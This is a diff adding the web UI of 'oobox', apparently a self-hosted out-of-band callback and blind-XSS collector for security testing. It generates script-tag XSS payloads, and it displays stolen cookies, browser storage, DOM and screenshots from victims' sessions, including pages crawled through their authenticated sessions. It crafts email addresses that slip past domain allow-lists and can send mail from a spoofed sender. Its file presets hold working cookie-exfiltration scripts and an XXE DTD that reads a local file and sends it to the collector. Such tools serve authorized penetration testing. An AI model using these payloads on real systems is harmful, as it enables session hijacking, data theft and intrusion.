@@ -1,0 +1,1074 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>oobox</title>
+<style>
+  :root{
+    color-scheme: light dark;
+    --bg:#0f1115; --panel:#171a21; --panel2:#1e222b; --border:#2a2f3a;
+    --fg:#e6e8ee; --muted:#8b93a7; --accent:#3b82f6; --accent2:#22c55e;
+    --dns:#a78bfa; --http:#38bdf8; --file:#facc15; --mail:#34d399; --xss:#fb7185;
+  }
+  @media (prefers-color-scheme: light){
+    :root{ --bg:#f4f5f8; --panel:#fff; --panel2:#f0f2f6; --border:#dce0e8;
+           --fg:#1a1d24; --muted:#5b6474; }
+  }
+  *{box-sizing:border-box}
+  [hidden]{display:none!important}   /* beats display:flex on .tools/.row2 containers */
+  body{margin:0;font:14px system-ui,-apple-system,Segoe UI,Roboto,sans-serif;
+       background:var(--bg);color:var(--fg)}
+  a{color:var(--accent);text-decoration:none} a:hover{text-decoration:underline}
+  header{display:flex;align-items:center;gap:12px;padding:10px 16px;
+         background:var(--panel);border-bottom:1px solid var(--border);position:sticky;top:0;z-index:5}
+  header h1{font-size:16px;margin:0;letter-spacing:.5px}
+  header .dom{color:var(--muted);font-size:12px}
+  header .sp{flex:1}
+  button{font:inherit;cursor:pointer;border:1px solid var(--border);background:var(--panel2);
+          color:var(--fg);border-radius:7px;padding:6px 12px}
+  button.primary{background:var(--accent);border-color:var(--accent);color:#fff;font-weight:600}
+  button:hover{filter:brightness(1.08)}
+  .wrap{display:grid;grid-template-columns:300px 1fr;height:calc(100vh - 53px)}
+  aside{border-right:1px solid var(--border);background:var(--panel);overflow-y:auto}
+  aside .tools{display:flex;gap:6px;padding:10px}
+  .searchbox{position:relative;flex:1;display:flex}
+  .searchbox input{width:100%;padding-right:28px}
+  .clearbtn{position:absolute;right:4px;top:50%;transform:translateY(-50%);border:0;
+    background:transparent;color:var(--muted);padding:2px 7px;font-size:12px;line-height:1;
+    cursor:pointer;border-radius:6px}
+  .clearbtn:hover{color:var(--fg);background:var(--panel2)}
+  .tok{padding:9px 12px;border-bottom:1px solid var(--border);cursor:pointer}
+  .tok:hover{background:var(--panel2)} .tok.active{background:var(--panel2);border-left:3px solid var(--accent)}
+  .tok .name{font-family:ui-monospace,SFMono-Regular,Menlo,monospace;font-weight:600}
+  .tok .note{color:var(--muted);font-size:12px;margin-top:2px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+  .badges{display:flex;flex-wrap:wrap;gap:4px;margin-top:6px}
+  .badge{font-size:10px;padding:1px 6px;border-radius:20px;background:var(--panel2);border:1px solid var(--border)}
+  .badge b{font-weight:700}
+  .b-dns{color:var(--dns)} .b-http{color:var(--http)} .b-file{color:var(--file)}
+  .b-mail{color:var(--mail)} .b-xss{color:var(--xss)}
+  main{overflow-y:auto;padding:16px 20px}
+  .empty{color:var(--muted);text-align:center;margin-top:60px}
+  .chips{display:flex;flex-wrap:wrap;gap:8px;margin:6px 0 14px}
+  .chip{display:flex;align-items:center;gap:6px;background:var(--panel);border:1px solid var(--border);
+        border-radius:7px;padding:5px 8px;font-size:12px;font-family:ui-monospace,monospace}
+  .chip .k{color:var(--muted);font-family:system-ui}
+  .chip button{padding:2px 7px;font-size:11px}
+  .tabs{display:flex;gap:4px;border-bottom:1px solid var(--border);margin-bottom:12px;flex-wrap:wrap}
+  .tab{padding:8px 14px;cursor:pointer;border-bottom:2px solid transparent;color:var(--muted)}
+  .tab.active{color:var(--fg);border-bottom-color:var(--accent);font-weight:600}
+  .tab .c{font-size:11px;background:var(--panel2);border-radius:20px;padding:0 6px;margin-left:5px}
+  table{width:100%;border-collapse:collapse;font-size:13px}
+  th,td{text-align:left;padding:7px 8px;border-bottom:1px solid var(--border);vertical-align:top}
+  th{color:var(--muted);font-weight:600;font-size:12px}
+  tr.row{cursor:pointer} tr.row:hover{background:var(--panel2)}
+  .k-dns{color:var(--dns)} .k-http{color:var(--http)} .k-file{color:var(--file)}
+  .k-mail{color:var(--mail)} .k-sent{color:var(--mail)} .k-xss{color:var(--xss)} .k-page{color:var(--http)}
+  .k-dns,.k-http,.k-file,.k-mail,.k-sent,.k-xss,.k-page{font-weight:600}
+  .mono{font-family:ui-monospace,SFMono-Regular,Menlo,monospace}
+  pre{background:var(--panel);border:1px solid var(--border);border-radius:8px;padding:10px;
+      overflow:auto;max-height:340px;white-space:pre-wrap;word-break:break-word;font-size:12px}
+  .detail{background:var(--panel2)}
+  .detail td{padding:12px 14px}
+  .kv{display:grid;grid-template-columns:120px 1fr;gap:4px 12px;font-size:13px}
+  .kv .k{color:var(--muted)}
+  .shot{max-width:100%;border:1px solid var(--border);border-radius:8px;margin-top:8px}
+  .links a{display:block;margin:2px 0}
+  .muted{color:var(--muted)}
+  .err{color:var(--xss);padding:10px 0}
+  textarea,input[type=text],input[type=email],select{width:100%;box-sizing:border-box;
+    padding:7px 9px;border-radius:7px;border:1px solid var(--border);background:var(--bg);
+    color:var(--fg);font:13px system-ui}
+  textarea{font-family:ui-monospace,SFMono-Regular,Menlo,monospace;min-height:130px;resize:vertical}
+  .form{background:var(--panel);border:1px solid var(--border);border-radius:8px;padding:12px;margin-bottom:16px}
+  .form h4{margin:0 0 8px} .grid2{display:grid;grid-template-columns:2fr 1fr;gap:8px}
+  .row2{display:flex;gap:8px;align-items:center;flex-wrap:wrap;margin-top:8px}
+  .presets{display:flex;gap:6px;flex-wrap:wrap;margin-bottom:8px}
+  .presets button{font-size:11px;padding:3px 8px}
+  .hint{color:var(--muted);font-size:12px;margin-top:6px}
+  .ok{color:var(--accent2);font-size:12px}
+  .sect{font-size:12px;color:var(--muted);text-transform:uppercase;letter-spacing:.5px;margin:16px 0 6px}
+  @media (max-width:720px){ .wrap{grid-template-columns:1fr} aside{display:none} aside.show{display:block} }
+</style>
+</head>
+<body>
+<header>
+  <h1 id="home" style="cursor:pointer">oobox</h1><span class="dom" id="dom"></span>
+  <span class="sp"></span>
+  <button id="navfeed">Activity</button>
+  <button id="navmail">Emails</button>
+  <button id="navxss">Blind XSS</button>
+  <button id="navzone">DNS Zone</button>
+  <button class="primary" id="new">+ New token</button>
+  <button id="refresh">Refresh</button>
+  <a href="/logout"><button>Logout</button></a>
+</header>
+<div class="wrap">
+  <aside>
+    <div class="tools">
+      <div class="searchbox">
+        <input id="tsearch" type="text" placeholder="search token / note…" autocomplete="off">
+        <button id="tsearchclear" class="clearbtn" hidden aria-label="clear search" title="clear">✕</button>
+      </div>
+    </div>
+    <div id="tokens"></div>
+    <div class="tools" id="tokfoot" hidden>
+      <button id="tokmore">Load more</button>
+      <span id="tokcount" class="hint" style="align-self:center"></span>
+    </div>
+  </aside>
+  <main id="main"><div class="empty">Select a token, or create one with <b>+ New token</b>.</div></main>
+</div>
+
+<script>
+"use strict";
+// ---- safe DOM builder: strings become textContent, never HTML -------------
+function el(tag, attrs, children){
+  var n = document.createElement(tag);
+  if (attrs) for (var k in attrs){
+    if (k === "class") n.className = attrs[k];
+    else if (k === "text") n.textContent = attrs[k];
+    else if (k.slice(0,2) === "on") n.addEventListener(k.slice(2), attrs[k]);
+    else if (attrs[k] != null) n.setAttribute(k, attrs[k]);
+  }
+  if (children != null){
+    (Array.isArray(children) ? children : [children]).forEach(function(c){
+      if (c == null) return;
+      n.appendChild(typeof c === "string" ? document.createTextNode(c) : c);
+    });
+  }
+  return n;
+}
+function clear(n){ while(n.firstChild) n.removeChild(n.firstChild); }
+
+// ---- API ------------------------------------------------------------------
+async function api(path){
+  var r = await fetch(path, {headers:{Accept:"application/json"}, credentials:"same-origin"});
+  if (r.status === 401){ location = "/login"; return null; }
+  if (!r.ok) throw new Error(path + " → " + r.status);
+  return r.json();
+}
+async function post(path, body){
+  var r = await fetch(path, {method:"POST", credentials:"same-origin",
+    headers:{"Content-Type":"application/json"}, body: JSON.stringify(body||{})});
+  if (r.status === 401){ location = "/login"; return null; }
+  if (!r.ok) throw new Error(path + " → " + r.status);
+  return r.json();
+}
+function ts(t){ return t ? new Date(t*1000).toLocaleString() : "—"; }
+// Copy to clipboard. navigator.clipboard only exists in secure contexts
+// (HTTPS / localhost); over plain HTTP it's undefined, so fall back to a
+// hidden textarea + execCommand so copy still works without TLS.
+function copyText(val){
+  if (navigator.clipboard && navigator.clipboard.writeText){
+    return navigator.clipboard.writeText(val).catch(function(){ return copyFallback(val); });
+  }
+  return copyFallback(val);
+}
+function copyFallback(val){
+  var ta = document.createElement("textarea");
+  ta.value = val;
+  ta.setAttribute("readonly", "");
+  ta.style.position = "fixed";
+  ta.style.top = "-1000px";
+  ta.style.opacity = "0";
+  document.body.appendChild(ta);
+  ta.select();
+  try { document.execCommand("copy"); } catch (e) { /* ignore */ }
+  document.body.removeChild(ta);
+  return Promise.resolve();
+}
+function flashCopied(btn){
+  var prev = btn.textContent;
+  btn.textContent = "copied";
+  setTimeout(function(){ btn.textContent = prev; }, 1000);
+}
+function copyBtn(val){
+  return el("button", {text:"copy", onclick:function(){
+    var b = this; copyText(val).then(function(){ flashCopied(b); }); }});
+}
+
+// ---- state ----------------------------------------------------------------
+var state = { sel:null, tab:"interactions", tls:false, domain:"", smtpSend:false, view:"tokens" };
+var SIDEBAR_PAGE = 50;
+var sidebar = { q:"", limit:SIDEBAR_PAGE };
+
+async function loadTokens(){
+  var url = "/overview?limit="+sidebar.limit + (sidebar.q ? "&q="+encodeURIComponent(sidebar.q) : "");
+  var data = await api(url); if (!data) return;
+  state.tls = data.tls; state.domain = data.domain; state.smtpSend = !!data.smtp_send;
+  document.getElementById("dom").textContent = data.domain + (data.tls ? " · TLS" : " · no TLS");
+  var box = document.getElementById("tokens"); clear(box);
+  if (!data.tokens.length){
+    box.appendChild(el("div",{class:"tok muted",text: sidebar.q ? "no match" : "no tokens yet"}));
+  }
+  data.tokens.forEach(function(t){
+    var c = t.counts;
+    var badges = el("div",{class:"badges"}, [
+      badge("b-dns","dns",c.dns), badge("b-http","http",c.http), badge("b-file","file",c.file),
+      badge("b-mail","mail",c.mail), badge("b-mail","sent",c.sent), badge("b-xss","xss",c.xss),
+      badge("b-http","pages",c.pages||0)
+    ]);
+    var row = el("div",{class:"tok"+(state.sel===t.token?" active":""),
+      onclick:function(){ selectToken(t.token); }},[
+      el("div",{class:"name",text:t.token}),
+      t.note ? el("div",{class:"note",text:t.note}) : null,
+      badges
+    ]);
+    box.appendChild(row);
+  });
+  // footer: shown/total + load-more
+  var total = data.total != null ? data.total : data.tokens.length;
+  var shown = data.tokens.length;
+  document.getElementById("tokcount").textContent = shown + " / " + total;
+  document.getElementById("tokfoot").hidden = !(total > shown);
+}
+function badge(cls,label,n){ return el("span",{class:"badge "+cls},[label+" ",el("b",{text:String(n||0)})]); }
+
+async function selectToken(tok, tab){
+  state.sel = tok; state.view = "tokens";
+  state.tab = tab || "interactions";   // default to the first tab on open (feed jumps pass one)
+  document.querySelectorAll(".tok").forEach(function(x){ x.classList.remove("active"); });
+  await loadTokens();  // re-render sidebar highlight + counts
+  await renderMain();
+}
+
+async function renderMain(){
+  var main = document.getElementById("main"); clear(main);
+  if (!state.sel){ main.appendChild(el("div",{class:"empty",text:"Select a token."})); return; }
+  var look = await api("/lookup?token=" + encodeURIComponent(state.sel)); if (!look) return;
+  var ep = look.endpoints, c = look.counts;
+
+  main.appendChild(el("h2",{class:"mono",text:state.sel}));
+  if (look.note) main.appendChild(el("div",{class:"muted",text:look.note}));
+  main.appendChild(chip("subdomain", ep.subdomain));
+  main.appendChild(el("div",{class:"chips"},[
+    chip("email", ep.email), chip("collector", ep.collector_js),
+    chip("xss payload", '<script src="' + ep.collector_js + '"></' + 'script>')
+  ]));
+
+  var tabs = el("div",{class:"tabs"});
+  [["interactions","Interactions",c.dns+c.http+c.file],["mail","Mail",c.mail],
+   ["xss","XSS",c.xss],["pages","Pages",c.pages||0],
+   ["files","Files",c.hosted_files]].forEach(function(t){
+    tabs.appendChild(el("div",{class:"tab"+(state.tab===t[0]?" active":""),
+      onclick:function(){ state.tab=t[0]; renderMain(); }},[
+        t[1], el("span",{class:"c",text:String(t[2])})]));
+  });
+  main.appendChild(tabs);
+
+  var body = el("div",{id:"tabbody"}); main.appendChild(body);
+  body.appendChild(el("div",{class:"muted",text:"loading…"}));
+  if (state.tab==="interactions") await tabInteractions(body);
+  else if (state.tab==="mail") await tabMail(body);
+  else if (state.tab==="xss") await tabXss(body, ep);
+  else if (state.tab==="pages") await tabPages(body);
+  else if (state.tab==="files") await tabFiles(body);
+}
+
+function chip(k,v){
+  return el("span",{class:"chip"},[el("span",{class:"k",text:k+": "}),
+    document.createTextNode(v), copyBtn(v)]);
+}
+function table(headers){
+  var t = el("table"); var tr = el("tr");
+  headers.forEach(function(h){ tr.appendChild(el("th",{text:h})); });
+  t.appendChild(el("thead",null,tr)); t.appendChild(el("tbody"));
+  return t;
+}
+function expandRow(tbody, tr, buildDetail){
+  tr.addEventListener("click", function(){
+    var next = tr.nextSibling;
+    if (next && next.classList && next.classList.contains("detail")){ tbody.removeChild(next); return; }
+    var dtr = el("tr",{class:"detail"});
+    var td = el("td"); td.colSpan = tr.children.length;
+    dtr.appendChild(td); buildDetail(td);
+    tbody.insertBefore(dtr, tr.nextSibling);
+  });
+}
+
+// Reusable newest-first paged table (50/page + Load more), used by every list view.
+var MAIN_PAGE = 50;
+var BIG_ID = 9007199254740991;
+function pagedTable(container, cols, fetchPage, rowFn, emptyText){
+  var t = table(cols); container.appendChild(t);
+  var tb = t.querySelector("tbody");
+  var wrap = el("div",{class:"row2"}); var moreBtn = el("button",{text:"Load more"});
+  moreBtn.hidden = true; wrap.appendChild(moreBtn); container.appendChild(wrap);
+  var cursor = null;
+  async function load(reset){
+    var d = await fetchPage(cursor != null ? cursor : BIG_ID); if(!d) return;
+    if (reset) clear(tb);
+    var items = d.items || [];
+    items.forEach(function(it){ rowFn(tb, it); });
+    if (reset && !items.length){
+      tb.appendChild(el("tr",null,[el("td",{colspan:String(cols.length),class:"muted",
+        text: emptyText||"none yet"})])); }
+    cursor = d.next_before; moreBtn.hidden = !cursor;
+  }
+  moreBtn.addEventListener("click", function(){ load(false); });
+  return load(true);
+}
+
+async function tabInteractions(body){
+  clear(body);
+  await pagedTable(body, ["time","kind","src","summary"],
+    function(before){
+      return api("/poll?token="+encodeURIComponent(state.sel)+"&limit="+MAIN_PAGE+"&before="+before)
+        .then(function(d){ return d ? {items:d.interactions, next_before:d.next_before} : null; });
+    },
+    function(tb, i){
+      var tr = el("tr",{class:"row"},[
+        el("td",{text:ts(i.ts)}), el("td",{class:"k-"+i.kind,text:i.kind}),
+        el("td",{class:"mono",text:i.src_ip||"—"}), el("td",{class:"mono",text:i.summary||""})]);
+      expandRow(tb, tr, function(td){ td.appendChild(pre(i.detail)); });
+      tb.appendChild(tr);
+    }, "no DNS/HTTP/file hits yet");
+}
+
+async function tabMail(body){
+  clear(body);
+  var craftedFrom = null, applyFrom = null;
+
+  // -- compose / send (only when outbound is enabled) --
+  if (state.smtpSend){
+    var toI = el("input",{type:"text",placeholder:"recipient@example.com"});
+    var subI = el("input",{type:"text",placeholder:"subject"});
+    var bodyI = el("textarea",{placeholder:"message…"});
+    var smsg = el("span",{class:"ok"});
+    var fromLine = el("div",{class:"hint"});
+    function renderFromLine(){
+      clear(fromLine);
+      if (craftedFrom){
+        fromLine.appendChild(document.createTextNode("from "));
+        fromLine.appendChild(el("span",{class:"mono",text:craftedFrom}));
+        fromLine.appendChild(document.createTextNode(" (crafted) "));
+        fromLine.appendChild(el("button",{text:"×",title:"reset to token",
+          onclick:function(){ applyFrom(null); }}));
+      } else {
+        fromLine.textContent = "from "+state.sel+"@"+state.domain+" — replies come back to this token";
+      }
+    }
+    applyFrom = function(a){ craftedFrom = a || null; renderFromLine(); };
+    renderFromLine();
+    var sendBtn = el("button",{class:"primary",text:"Send", onclick:async function(){
+      smsg.textContent=""; smsg.className="ok";
+      if(!toI.value || toI.value.indexOf("@")<0){ smsg.className="err"; smsg.textContent="valid 'to' required"; return; }
+      var payload = craftedFrom ? {from_full:craftedFrom} : {token:state.sel};
+      payload.to=toI.value; payload.subject=subI.value; payload.body=bodyI.value;
+      var res = await post("/send", payload);
+      if(!res) return;
+      if(res.result && res.result.ok){ smsg.textContent="sent from "+res.from; toI.value=subI.value=bodyI.value=""; tabMailLists(body); }
+      else { smsg.className="err"; smsg.textContent="failed: "+((res.result||{}).error||"delivery error"); }
+    }});
+    body.appendChild(el("div",{class:"form"},[
+      el("h4",{text:"Send mail"}), fromLine,
+      field("to", toI), el("div",{style:"height:8px"}), field("subject", subI),
+      el("div",{style:"height:8px"}), bodyI,
+      el("div",{class:"row2"},[sendBtn, smsg])
+    ]));
+  } else {
+    body.appendChild(el("div",{class:"hint",
+      text:"Outbound send is disabled. Set OOB_SMTP_SEND=true (and OOB_SMTP_RELAY) to compose here."}));
+  }
+
+  // -- crafted victim-embedding catch-addresses (correlated to this token) --
+  body.appendChild(emailCraftBuilder({ token: state.sel, onUseFrom: applyFrom }));
+
+  var lists = el("div",{id:"maillists"}); body.appendChild(lists);
+  tabMailLists(body);
+}
+
+async function tabMailLists(body){
+  var box = body.querySelector("#maillists"); if(!box) return; clear(box);
+  // sent
+  var sd = await api("/sent?token="+encodeURIComponent(state.sel));
+  if (sd && sd.sent.length){
+    box.appendChild(el("div",{class:"sect",text:"Sent"}));
+    var st = table(["time","to","subject","result"]); var stb = st.querySelector("tbody");
+    sd.sent.slice().reverse().forEach(function(m){
+      var res = (m.detail&&m.detail.result)||{};
+      var tr = el("tr",{class:"row"},[
+        el("td",{text:ts(m.ts)}), el("td",{class:"mono",text:m.mail_to}),
+        el("td",{text:m.subject||"(no subject)"}),
+        el("td",{class: res.ok?"ok":"err", text: res.ok?"ok":(res.error||"fail")})]);
+      expandRow(stb, tr, function(td){
+        var det = m.detail||{};
+        td.appendChild(kv([["from",m.mail_from],["to",m.mail_to],["subject",m.subject],
+          ["result", res.ok ? ("delivered via "+(res.host||"?")+":"+(res.port||"?"))
+                            : ("FAILED: "+(res.error||"delivery error"))]]));
+        if (det.body){ td.appendChild(el("h4",{text:"Body"})); td.appendChild(el("pre",{text:det.body})); }
+        if (det.html){ td.appendChild(el("h4",{text:"HTML (text)"})); td.appendChild(el("pre",{text:det.html})); }
+      });
+      stb.appendChild(tr);
+    });
+    box.appendChild(st);
+  }
+  // received (paged)
+  box.appendChild(el("div",{class:"sect",text:"Received"}));
+  await pagedTable(box, ["time","from","subject"],
+    function(before){
+      return api("/mail?token="+encodeURIComponent(state.sel)+"&limit="+MAIN_PAGE+"&before="+before)
+        .then(function(d){ return d ? {items:d.emails, next_before:d.next_before} : null; });
+    },
+    function(tb, m){
+      var tr = el("tr",{class:"row"},[
+        el("td",{text:ts(m.ts)}), el("td",{class:"mono",text:m.mail_from||"—"}),
+        el("td",{text:m.subject||"(no subject)"})]);
+      expandMail(tb, tr, state.sel, m.id); tb.appendChild(tr);
+    }, "no mail yet");
+}
+
+// Shared received-email detail renderer (per-token Mail tab + global Emails page).
+function emailDetail(td, full){
+  var det = full.detail||{};
+  td.appendChild(kv([["token",full.token],["from",full.mail_from],
+    ["to",(det.rcpt_tos||[]).join(", ")],["subject",full.subject]]));
+  if ((det.links||[]).length){
+    td.appendChild(el("h4",{text:"Links"}));
+    var lb = el("div",{class:"links"});
+    det.links.forEach(function(u){ lb.appendChild(
+      el("a",{href:u,target:"_blank",rel:"noopener noreferrer",text:u})); });
+    td.appendChild(lb);
+  }
+  if (det.text){ td.appendChild(el("h4",{text:"Text"})); td.appendChild(el("pre",{text:det.text})); }
+  if (det.html){ td.appendChild(el("h4",{text:"HTML (text)"})); td.appendChild(el("pre",{text:det.html})); }
+}
+function expandMail(tb, tr, token, id){
+  expandRow(tb, tr, function(td){
+    td.appendChild(el("div",{class:"muted",text:"loading…"}));
+    api("/mail/"+id+"?token="+encodeURIComponent(token)).then(function(full){
+      clear(td); if(!full) return; emailDetail(td, full);
+    });
+  });
+}
+
+// ---- crafted email-address builder (embed a target domain) ----------------
+// Generates catch-addresses that embed a "victim" domain (local-part and subdomain shapes)
+// so a validator that allow-lists it accepts them while mail still delivers here. "where"
+// is the bucket caught mail lands in; pass a token (opts.token or the input) for clean
+// correlation. opts.onUseFrom(addr), when given, adds a "use as From" button on sendable rows.
+function emailCraftBuilder(opts){
+  opts = opts || {};
+  var box = el("div",{class:"form"});
+  box.appendChild(el("h4",{text:"Crafted addresses — embed a target domain"}));
+  var victimI = el("input",{type:"text",placeholder:"victim.tld / internal-api / 169.254.169.254"});
+  box.appendChild(field("target (domain, host, or IP)", victimI));
+  var tokenI = null;
+  if (opts.showTokenInput){
+    tokenI = el("input",{type:"text",placeholder:"ob-token to correlate (optional)"});
+    box.appendChild(field("correlate to token", tokenI));
+  }
+  box.appendChild(el("div",{class:"hint",text:"embeds the target domain so an allow-list that "
+    + "matches it accepts the address, while mail still delivers here — for authorized testing. "
+    + "“where” is the bucket caught mail lands in; give a token for clean correlation."}));
+  var out = el("div"); box.appendChild(out);
+  var timer = null;
+  function schedule(){ clearTimeout(timer); timer = setTimeout(build, 250); }
+  async function build(){
+    clear(out);
+    var v = (victimI.value||"").trim().toLowerCase().replace(/^[@.]+|\.+$/g, "");
+    if (!v) return;
+    var tok = opts.token || (tokenI && tokenI.value.trim()) || "";
+    var q = "/craft?victim="+encodeURIComponent(v) + (tok ? "&token="+encodeURIComponent(tok) : "");
+    var d;
+    try { d = await api(q); } catch(e){ out.appendChild(el("div",{class:"err",text:"invalid target string"})); return; }
+    if (!d) return;
+    var t = table(["crafted address","where","actions"]); var tb = t.querySelector("tbody");
+    d.addresses.forEach(function(a){
+      var acts = [copyBtn(a.address)];
+      if (opts.onUseFrom && a.sendable){
+        acts.push(el("button",{text:"use as From", onclick:function(){ opts.onUseFrom(a.address); }}));
+      }
+      var tr = el("tr",{class:"row"},[
+        el("td",{class:"mono",text:a.address}),
+        el("td",{class:"mono",text:a.correlates||"—"}),
+        el("td",null,acts)]);
+      expandRow(tb, tr, function(td){ td.appendChild(kv([["kind",a.kind],["note",a.note],
+        ["deliverable", a.deliverable ? "yes" : "no — validator payload"],
+        ["sendable", a.sendable ? "yes" : "no"]])); });
+      tb.appendChild(tr);
+    });
+    out.appendChild(t);
+  }
+  victimI.addEventListener("input", schedule);
+  if (tokenI) tokenI.addEventListener("input", schedule);
+  return box;
+}
+
+async function tabXss(body, ep){
+  clear(body);
+
+  // -- payload builder: base collector + optional tag / additional-pages / spider --
+  var tagI = el("input",{type:"text",placeholder:"which sink? e.g. login-name (optional)"});
+  var pagesI = el("input",{type:"text",placeholder:"/admin,/users/1 (optional)"});
+  var depthI = el("input",{type:"text",value:"0",style:"max-width:70px"});
+  var maxI = el("input",{type:"text",value:"20",style:"max-width:70px"});
+  var out = el("input",{type:"text",readonly:"readonly"});
+  function build(){
+    var q = [];
+    if (tagI.value.trim()) q.push("tag="+encodeURIComponent(tagI.value.trim()));
+    if (pagesI.value.trim()) q.push("pages="+encodeURIComponent(pagesI.value.trim()));
+    var depth = parseInt(depthI.value,10)||0;
+    if (depth>0){ q.push("spider="+depth); q.push("max="+(parseInt(maxI.value,10)||20)); }
+    var src = ep.collector_js + (q.length? "?"+q.join("&") : "");
+    out.value = '<script src="'+src+'"></'+'script>';
+  }
+  [tagI,pagesI,depthI,maxI].forEach(function(i){ i.addEventListener("input", build); });
+  build();
+  body.appendChild(el("div",{class:"form"},[
+    el("h4",{text:"Blind-XSS payload"}),
+    field("label / tag (marks which sink fired)", tagI),
+    el("div",{class:"grid2"},[ field("additional pages (comma)", pagesI),
+      el("div",{class:"row2"},[field("spider depth", depthI), field("max pages", maxI)]) ]),
+    el("div",{class:"hint",text:"any extra ?key=value on the src is captured too; spider is opt-in, GET-only, same-origin, capped, skips logout/delete-type links"}),
+    el("div",{class:"row2"},[out, copyBtn2(out)])
+  ]));
+
+  var listBox = el("div",{id:"xsslist"}); body.appendChild(listBox);
+  await tabXssList(listBox);
+}
+function copyBtn2(input){
+  return el("button",{text:"copy", onclick:function(){
+    var b = this;
+    input.select && input.select();
+    copyText(input.value).then(function(){ flashCopied(b); }); }});
+}
+
+// Shared XSS report detail renderer (used by the per-token XSS tab and the global page).
+function xssDetail(td, full){
+  var det = full.detail||{};
+  td.appendChild(kv([["token",full.token],["tag",full.tag],["origin",det.uri||det.origin],
+    ["cookies",det.cookies],["user-agent",det["user-agent"]],["referer",det.referer],
+    ["screen",det.screen]]));
+  if (det.custom && Object.keys(det.custom).length){
+    td.appendChild(el("h4",{text:"custom params"})); td.appendChild(pre(det.custom)); }
+  var shot = det.screenshot;
+  if (typeof shot === "string" && /^data:image\//.test(shot)){
+    td.appendChild(el("h4",{text:"Screenshot"}));
+    td.appendChild(el("img",{class:"shot",src:shot,alt:"screenshot"}));
+  }
+  if (det.localstorage && Object.keys(det.localstorage).length){
+    td.appendChild(el("h4",{text:"localStorage"})); td.appendChild(pre(det.localstorage)); }
+  if (det.sessionstorage && Object.keys(det.sessionstorage).length){
+    td.appendChild(el("h4",{text:"sessionStorage"})); td.appendChild(pre(det.sessionstorage)); }
+  if (det.dom){ td.appendChild(el("h4",{text:"DOM (text)"}));
+    td.appendChild(el("pre",{text: det.dom.length>20000 ? det.dom.slice(0,20000)+"\n…[truncated]" : det.dom})); }
+}
+function expandXss(tb, tr, token, id){
+  expandRow(tb, tr, function(td){
+    td.appendChild(el("div",{class:"muted",text:"loading…"}));
+    api("/xss/"+id+"?token="+encodeURIComponent(token)).then(function(full){
+      clear(td); if(!full) return; xssDetail(td, full);
+    });
+  });
+}
+
+async function tabXssList(body){
+  clear(body);
+  await pagedTable(body, ["time","tag","origin","src"],
+    function(before){
+      return api("/xss?token="+encodeURIComponent(state.sel)+"&limit="+MAIN_PAGE+"&before="+before)
+        .then(function(d){ return d ? {items:d.reports, next_before:d.next_before} : null; });
+    },
+    function(tb, x){
+      var tr = el("tr",{class:"row"},[
+        el("td",{text:ts(x.ts)}), el("td",{class:"mono",text:x.tag||"—"}),
+        el("td",{class:"mono",text:x.origin||"—"}), el("td",{class:"mono",text:x.src_ip||"—"})]);
+      expandXss(tb, tr, state.sel, x.id); tb.appendChild(tr);
+    }, "no blind-XSS reports yet");
+}
+
+async function tabPages(body){
+  clear(body);
+  body.appendChild(el("div",{class:"hint",
+    text:"Same-origin pages fetched through the victim's authenticated session (additional-pages list and/or spider)."}));
+  await pagedTable(body, ["time","depth","status","url"],
+    function(before){
+      return api("/pages?token="+encodeURIComponent(state.sel)+"&limit="+MAIN_PAGE+"&before="+before)
+        .then(function(d){ return d ? {items:d.pages, next_before:d.next_before} : null; });
+    },
+    function(tb, p){
+      var tr = el("tr",{class:"row"},[
+        el("td",{text:ts(p.ts)}), el("td",{text:String(p.depth)}),
+        el("td",{text:String(p.status)}), el("td",{class:"mono",text:p.url||"—"})]);
+      expandRow(tb, tr, function(td){
+        td.appendChild(el("div",{class:"muted",text:"loading…"}));
+        api("/pages/"+p.id+"?token="+encodeURIComponent(state.sel)).then(function(full){
+          clear(td); if(!full) return; var det = full.detail||{};
+          td.appendChild(kv([["url",full.url],["status",full.status],["depth",full.depth],
+            ["title",det.title],["parent report",full.parent]]));
+          if (det.dom){ td.appendChild(el("h4",{text:"DOM (text)"}));
+            td.appendChild(el("pre",{text: det.dom.length>20000 ? det.dom.slice(0,20000)+"\n…[truncated]" : det.dom})); }
+        });
+      });
+      tb.appendChild(tr);
+    }, "no fetched pages yet");
+}
+
+function tokenBase(){ return (state.tls?"https":"http")+"://"+state.sel+"."+state.domain; }
+
+var FILE_PRESETS = [
+  {name:"SVG XSS", path:"/x.svg", type:"image/svg+xml", tpl:function(b){
+    return '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)">\n'
+         + '  <script>fetch("'+b+'/xss-svg?c="+encodeURIComponent(document.cookie))</'+'script>\n</svg>';
+  }},
+  {name:"XXE DTD", path:"/evil.dtd", type:"application/xml-dtd", tpl:function(b){
+    return '<!ENTITY % file SYSTEM "file:///etc/hostname">\n'
+         + '<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM \''+b+'/xxe?d=%file;\'>">\n'
+         + '%eval;\n%exfil;';
+  }},
+  {name:"Redirect page", path:"/r.html", type:"text/html", tpl:function(b){
+    return '<!doctype html><meta http-equiv="refresh" content="0;url=https://TARGET/">\n'
+         + '<script>location="https://TARGET/"</'+'script>';
+  }},
+  {name:"JS payload", path:"/p.js", type:"application/javascript", tpl:function(b){
+    return 'new Image().src="'+b+'/js?c="+encodeURIComponent(document.cookie);';
+  }},
+  {name:"Blank", path:"/payload.txt", type:"text/plain", tpl:function(b){ return ""; }}
+];
+
+async function uploadRaw(path, contentType, body){
+  var url = "/upload?token="+encodeURIComponent(state.sel)+"&path="+encodeURIComponent(path);
+  var r = await fetch(url, {method:"POST", credentials:"same-origin",
+    headers:{"Content-Type": contentType || "application/octet-stream"}, body: body});
+  if (r.status === 401){ location = "/login"; return null; }
+  var j = await r.json().catch(function(){ return {}; });
+  return {status:r.status, json:j};
+}
+
+async function tabFiles(body){
+  clear(body);
+  var base = tokenBase();
+
+  // -- create / author a payload in-browser --
+  var pathI = el("input",{type:"text",value:"/payload.txt",id:"file-path"});
+  var typeI = el("input",{type:"text",value:"text/plain",id:"file-type"});
+  var ta = el("textarea",{placeholder:"file contents…",id:"file-body"});
+  var msg = el("span",{class:"ok"});
+  var presets = el("div",{class:"presets"});
+  FILE_PRESETS.forEach(function(p){
+    presets.appendChild(el("button",{text:p.name, onclick:function(){
+      pathI.value=p.path; typeI.value=p.type; ta.value=p.tpl(base);
+    }}));
+  });
